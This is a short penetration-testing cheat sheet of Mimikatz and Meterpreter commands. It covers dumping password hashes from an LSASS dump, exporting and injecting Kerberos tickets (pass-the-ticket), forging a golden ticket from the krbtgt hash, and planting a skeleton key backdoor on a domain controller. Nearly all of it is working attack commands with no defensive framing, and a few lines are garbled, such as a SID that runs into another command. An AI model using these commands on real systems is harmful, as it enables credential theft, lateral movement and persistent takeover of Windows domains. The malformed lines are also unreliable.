# mimikatz

### Dump Hshes
```bash
.\mimikatz.exe
sekurlsa::minidump /users/admin/Desktop/lsass.DMP
sekurlsa::LogonPasswords
meterpreter > getprivs
meterpreter > creds_all
meterpreter > golden_ticket_create
```

### Pass the Ticket
```bash
.\mimikatz.exe
sekurlsa::tickets /export
kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-<RHOST>.LOCAL.kirbi
klist
dir \\<RHOST>\admin$
```

### Forging Golden Ticket
```bash
.\mimikatz.exe
privilege::debug
lsadump::lsa /inject /name:krbtgt
kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-misc::cmd
klist
dir \\<RHOST>\admin$
```

### Skeleton Key
```bash
privilege::debug
misc::skeleton
net use C:\\<RHOST>\admin$ /user:Administrator mimikatz
dir \\<RHOST>\c$ /user:<USERNAME> mimikatz
```

